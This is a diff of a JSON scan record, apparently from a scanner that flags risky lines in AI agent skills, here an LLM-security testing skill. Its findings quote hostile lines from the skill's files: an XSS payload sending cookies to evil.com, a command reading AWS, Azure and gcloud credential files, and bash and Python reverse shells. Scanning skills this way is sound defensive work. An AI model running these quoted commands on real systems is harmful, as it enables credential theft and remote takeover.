@@ -4,30 +4,147 @@
   "repo": "skillquarium",
   "path": "skills/reverse-skill-router/llm-security",
   "name": "llm-security",
-  "description": "",
+  "description": "Use for authorized security assessment of LLM applications and AI agents, including prompt injection, tool abuse, RAG exposure, memory poisoning, and model supply-chain risks.",
   "stars": 12,
   "category": "security",
-  "commit": "f748ea91aa51ce8fc42c27c809dba73a8377b1d5",
-  "contentHash": "5f06abe182824f6d3e5b19ab51cfcae3d9fe80224ce25a7f8817128864a79809",
+  "commit": "ced6c96bd67acccbf0280a5071e59a523c118c66",
+  "contentHash": "6d21cf493630b68c00aa5d589ecc96d9f2056d58824380375e906c4bbc4ac936",
   "repoCreatedAt": "2026-06-09T12:36:45Z",
   "alsoFoundIn": [],
   "status": "ok",
-  "incomplete": true,
-  "scannedAt": "2026-11-08T09:45:03.483Z",
+  "incomplete": false,
+  "scannedAt": "2026-11-13T10:10:34.466Z",
   "scan": {
-    "findings": [],
-    "findingTotals": {},
-    "score": 100,
-    "band": "low",
+    "findings": [
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/reverse-skill-router/llm-security/SKILL.md",
+        "line": 121,
+        "excerpt": "| garak | 100+ 注入探针自动化 | `pip install garak` |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/reverse-skill-router/llm-security/SKILL.md",
+        "line": 122,
+        "excerpt": "| PyRIT | 多轮攻击编排 (Microsoft) | `pip install pyrit` |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/reverse-skill-router/llm-security/SKILL.md",
+        "line": 123,
+        "excerpt": "| promptfoo | AI 生成攻击 + 回归测试 | `npm install -g promptfoo` |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/reverse-skill-router/llm-security/references/agent-security-testing.md",
+        "line": 92,
+        "excerpt": "| 生成 HTML/JS | `<img src=x onerror=fetch('https://evil.com/'+document.cookie)>` | HTML 实体编码 |",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "evil.com"
+        ]
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/reverse-skill-router/llm-security/references/prompt-injection-methodology.md",
+        "line": 60,
+        "excerpt": "pip install garak",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/reverse-skill-router/field-journal/precedent-pentest.md",
+        "line": 26,
+        "excerpt": "□ crt.sh: curl -s \"https://crt.sh/?q=%25.{target_domain}&output=json\" | jq -r '.[].name_value' | sort -u",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "crt.sh"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/reverse-skill-router/field-journal/precedent-pentest.md",
+        "line": 53,
+        "excerpt": "□ curl -sI https://{target_domain} | grep -i \"server\\|x-powered-by\\|x-aspnet\\|set-cookie\"",
+        "disclosed": false,
+        "automatic": false,
+        "hosts": [
+          "{target_domain}"
+        ]
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/reverse-skill-router/field-journal/precedent-pentest.md",
+        "line": 441,
+        "excerpt": "□ cat ~/.aws/credentials ~/.azure/accessTokens.json ~/.config/gcloud/credentials.json",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/reverse-skill-router/field-journal/precedent-pentest.md",
+        "line": 459,
+        "excerpt": "□ bash -c 'exec bash -i &>/dev/tcp/{ip}/{port} <&1'",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/reverse-skill-router/field-journal/precedent-pentest.md",
+        "line": 467,
+        "excerpt": "□ python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subproc",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "downloads-code",
+        "file": "skills/reverse-skill-router/ops/skill-supply-chain.md",
+        "line": 25,
+        "excerpt": "| 权限过度 | 无差别 `curl \\| bash`、全盘读 | bootstrap 仅 manifest 能力；scope `network_profile` |",
+        "disclosed": false,
+        "automatic": false
+      },
+      {
+        "ruleId": "reads-secrets",
+        "file": "skills/reverse-skill-router/ops/skill-supply-chain.md",
+        "line": 38,
+        "excerpt": "□ 无神秘外连、无读取 ~/.ssh / 浏览器库 的默认步骤",
+        "disclosed": false,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "downloads-code": 5,
+      "network": 3,
+      "reads-secrets": 2,
+      "shell": 2
+    },
+    "score": 57,
+    "band": "review",
     "rulesVersion": "1.3.0",
-    "filesScanned": 0,
-    "filesSkipped": 5
+    "filesScanned": 8,
+    "filesSkipped": 0
   },
   "history": [
     {
       "commit": "f748ea91aa51ce8fc42c27c809dba73a8377b1d5",
       "scannedAt": "2026-11-08T09:45:03.483Z",
       "score": 100,
+      "rulesVersion": "1.3.0"
+    },
+    {
+      "commit": "ced6c96bd67acccbf0280a5071e59a523c118c66",
+      "scannedAt": "2026-11-13T10:10:34.466Z",
+      "score": 57,
       "rulesVersion": "1.3.0"
     }
   ]
